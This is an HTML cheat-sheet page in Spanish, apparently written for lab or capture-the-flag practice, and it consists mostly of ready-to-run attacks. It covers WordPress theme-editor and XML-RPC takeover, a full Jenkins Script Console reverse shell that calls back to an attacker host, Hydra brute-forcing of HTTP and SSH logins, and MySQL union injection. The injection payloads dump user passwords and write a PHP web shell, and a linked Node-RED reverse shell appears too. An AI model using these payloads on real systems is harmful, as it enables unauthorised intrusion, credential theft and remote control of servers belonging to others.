<!DOCTYPE html>
<html>
<head>
	<title>Hacking Easy</title>
	<link rel="stylesheet" type="text/css" href="lindows.css">
</head>
<body>
	<header>
		<h1>Hacking Linux and Windows</h1>
		<nav>
			<ul>
				<li><a href="../index.html" style="color: red;"">Inicio</a></li>
				<li><a href="#">Acerca de</a></li>
				<li><a href="#">Contacto</a></li>
			</ul>
		</nav>
	</header>
	<main>
		<article>
			<h2>HACKING WORDPRESS</h2>
			<p>Reconocimiento de Wordpress:</p>
			<p id="code">wpscan --url $IP -e vp,u<br>
                wpscan --url $IP/blog --usernames admin --passwords $WORDLIST
            </p>
            <p>Si obtenemos acceso al Editor De Wordpress, entonces podemos dirigirnos a "Appearence" > "Theme Editor" y cambiar el "404.php" por un "reverse_shell.php".<br>Preferiblemente que sea el de Pentest Monkey: <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" style="color: red;" >php-reverse-shell.php</a></p>
            <p>Recuerda que debes cambiar la $IP y el $PORT para que funcione correctamente.<br>
                Luego de haberlo colocado, lo unico que hace falta es poner un listener y visitar la página para que se ejecute el php
            </p>
            <p id="code">nc -nlvp 1234<br>
                curl -s -X GET http://$IP/blog/wp-content/themes/twentyseventeen/404.php
            </p>
			<p>Si obtenemos que el /xmlrpc.php está activo, podemos autenticarnos e incluso tener mas opciones para trabajar:</p>
			<p id="code">#Buscamos "xmlrpc listMethods"<br>
				curl -s -X POST "http://facebook.htb/xmlrpc.php" -d "$XML-LIST-METHODS"
			</p>
			<p>Podemos obtener GetPosts y EditPosts cosa que si vemos que se ejecuta php en la página entonces lo podemos cambiar y obtener RCE.</p>
			<p id="code">pip3 install python-wordpress-xmlrpc<br><br>
				> from wordpress_xmlrpc import Client<br>
				> from wordpress_xmlrpc.methods import posts<br><br>
				> client = Client("http://facebook.htb/xmlrpc.php", "admin", "$password")<br>
				> post = client.call(posts.GetPosts())<br><br>
				> post[0].content #Vemos codigo php ejecutandose<br>
				> maldito = post[0]<br>
				> maldito.content = $CAMBIAR-CODIGO-POR-RCE-PHP<br>
				> client.call(posts.EditPost(maldito.id, maldito))
			</p>
			<p>Tambien pudriesemos subir un archivo con UploadFile si es que se encuentra en los xmlrpc Methdos</p>
			<p id="code">> from wordpress_xmlrpc.methods import media<br><br>
				> filename = open("pkwner.sh", "r").read()<br>
				> data_to_upload = { 'name':'momo.png','bits':filename, 'type':'text/plain' }<br>
				> client.call(media.UploadFile(data_to_upload))
			</p>
			<p>Es necesario subir el archivo como si fuera una imagen porque no acepta otras extensiones</p>
		</article>
		<article>
			<h2></h2>
			<p></p>
			<p id="code"></p>
		</article>
        <article>
			<h2>HACKING JENKINS</h2>
			<p>Si podes acceder al "Script Console", podemos crear un reverse shell de la siguiente forma. Recuerda poner un listener antes.</p>
			<p id="code">String host="$MP";<br>
                int port=1234;<br>
                String cmd="cmd.exe" / String cmd="/bin/bash";
                <br>Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
            </p>
		</article>
        <article>
			<h2>BRUTE FORCE WITH HYDRA</h2>
			<p>No siempre es bueno brute forcear, es mejor dejarlo como último disparo</p>
			<p id="code">hydra -l root -P $WORDLIST $IP -s 8080 http-post-form "/$path_del_login:username=^USER^&password=^PASS^:Invalid password" -V -I<br>
                hydra -l root -P $WORDLIST $IP ssh -V -I
            </p>
        </article>
		<article>
			<h2>SQLI (MYSQL)</h2>
			<p>Para obtener un simple error y que devuelva todos las columnas o incluso para bypassear LOGIN</p>
			<p id="code">'or 1=1-- -</p>
			<p>Obtener numero de columnas en uso para detectar uno injectable (Probar varios numeros, aquel que no te devuelva un error es porque es verdadero y hay ese numero de columnas en uso)</p>
			<p id="code">'order by 3-- -</p>
			<p>Ahora es necesario saber cúal es el injectable, es decir, en cual podemos ver el output que queremos(Donde ponga el numero, esa es la columna injectable, puede haber más de uno pero con uno nos la podemos arreglar de todas formas)</p>
			<p id="code">'union select 1,2,3-- -</p>
			<p>Ahora vamos a obtener información y verificar que podemos ver lo que queremos</p>
			<p id="code">'union select 1,"xd",3-- -<br>
				'union select 1,@@version,3-- -<br>
				'union select 1,user(),3-- -<br>
				'union select 1,system_user(),3-- -<br>
				'union select 1,database(),3-- -<br>
			</p>
			<p>Ahora vamos a listar databases, tables y columns </p>
			<p id="code">'union select 1,schema_name,3 from information_schema.schemata-- - #Dumpea Bases de Datos (elejimos facebook)<br>
				'union select 1,table_name,3 from information_schema.tables where table_schema="facebook"-- - #Dumpea Tablas de facebook (Elejimos users)<br>
				'union select 1,column_name,3 from information_schema.columns where table_schema="facebook" and table_name="users"-- - #Dumpea columnas de users (Queremos ver "username" y "password")<br>
				'union select 1,username||':'||password,3 from facebook.users-- -<br><br>
				'union select 1,group_concat(username, ':', password SEPARATOR ', '),3 from facebook.users where username="administrator"-- -
			</p>
			<p>Ahora vamos a obtener RCE con MYSQL al usar php en la página:</p>
			<p id="code">'union select 1,@@datadir,3-- -<br>
				'union select 1,'<_?php system($_GET["comando"]); ?_>',3 into outfile '/var/www/html/rce.php'-- -<br>
				http://facebook.htb/papu.php?comando=whoami #RCE
			</p>
		</article>
		<article>
			<h2>HACKING NODE RED</h2>
			<p>Si visitamos la pagina y dice "CAN NOT GET /", le enviamos POST</p>
			<p id="code">curl -s -X POST "http://facebook.htb/ | jq" #Dumpea json data con id y path</p>
			<p>Visitamos la página que nos dá y estamos dentro de Node RED</p>
			<p>Ahora hay que enviarle un reverse shell enviandole el json data de <a href="https://github.com/valkyrix/Node-Red-Reverse-Shell/blob/master/node-red-reverse-shell.json" style="color: red;"">Este Github</a> a través de IMPORT > CLIPBOARD > Pegamos Json</p>
			<p>Ponemos listener, le cambiamos la IP y PORT del json data y apretamos el boton de DEPLOY, se va a ejecutar para siempre</p>
		</article>
		<article>
			<h2></h2>
			<p></p>
			<p id="code"></p>
		</article>
	</main>
	<footer>
		<p>&copy; 2023 Hack Easy. Todos los derechos reservados.</p>
	</footer>
</body>
</html>
